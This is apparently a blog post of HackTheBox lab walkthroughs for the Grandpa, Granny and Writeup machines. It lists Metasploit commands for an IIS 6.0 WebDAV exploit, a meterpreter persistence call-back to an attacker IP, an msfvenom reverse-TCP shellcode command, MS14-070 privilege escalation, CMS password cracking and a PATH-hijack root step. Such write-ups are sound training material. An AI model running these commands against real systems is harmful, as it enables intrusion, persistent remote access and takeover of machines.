---
title: "HackTheBox - WriteUp 6"
date: 2019-06-14T14:07:30+08:00
description: "HackTheBox 练手 - Grandparents - MSF for Windows Target"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Grandpa & Granny

That really sucks. Even I use VPS in New York which result in ping response always in 20ms, it still failed to get connected from victim.

## MSF way

### Warm up

Nmap Scanned: Port 80 opened. IIS httpd 6.0 with Windows Server 2003.

### Normal User

Run these commands in `msfconsole`:

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.14
exploit
```

Then use these commands in meterpreter to stablize it:

```bash
run persistence -X -U -A -L %TEMP% -r 10.10.14.6 -p 4455
getuid
> Permission denied
migrate 2212    # davcdata.exe
getuid
> NT AUTHORITY\NETWORK SERVICE
bg
```

In fact, finally, I migrate to `wmiprvse.exe`. And wait for a long time before privilege escalation.

### Administrator / System

> Due to the fucking network on my VPS, this step took me a lot of time. So you must ensure your network stablity is really well.

```bash
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
exploit
bg
sessions -i 1
getuid
> NT AUTHORITY\SYSTEM
download "C:\Documents and settings\harry\desktop\user.txt"
download "C:\Documents and settings\administrator\desktop\root.txt"
```
Privilege Escalated. Finished.

## OSCP way

### Grandpa

CVE-2017-7629: https://github.com/danigargu/explodingcan

```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.16.80 LPORT=4444 >shellcode
```

Use the script from here to get a meterpreter shell. After that, Migrate the meterpreter to a stabler process. Download MS14-070 exploit from https://github.com/abatchy17/WindowsExploits. You'll have a `NT AUTHORITY/SYSTEM` shell.

### Granny

No way, totally MSF here.

TBH, I can write one using Python by analyzing the MSF exploit. But I don't think worth it.

# Writeup

Remember It's a EASY box.

This box has fail2ban mechanism, stop using automated tools, eg. SQLMAP.

## User

Use `nmap -A -O 10.10.10.138` to get the result.

You will find a `robots.txt` and a path `/writeup`.

Check the page source code, "CMS Made Simple" generated. Then `searchsploit` and choose the `46635.py`, finally, crack with `rockyou` in kali built-in wordlist.

## Root

> The quieter you are, the more you are able to hear.

Use Linenum to check the directory/files you can write. Then pay attention to PATH.

Next, run pspy64 and generate some traffic with login again.

You will find `run-parts` seems to be running in root and with a specific PATH in absolute path of the run-parts. According to the order of PATH, you just create a script, and `ln -s` to `/usr/local/bin`, then, you'll get it.

(DONE)


